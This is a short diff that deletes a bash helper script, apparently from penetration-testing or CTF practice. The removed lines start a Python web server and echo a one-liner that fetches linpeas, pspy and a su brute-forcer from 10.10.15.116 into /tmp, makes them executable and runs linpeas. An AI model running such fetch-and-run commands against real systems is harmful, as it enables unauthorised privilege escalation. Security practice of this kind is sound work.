@@ -1,6 +1,0 @@
-#!/bin/bash
-ips
-
-echo 'target=10.10.15.116;cd /tmp;wget $target/linpeas.sh;wget $target/pspy;wget $target/suForce;chmod +x *;./linpeas.sh'
-
-sudo python3 -m http.server 80
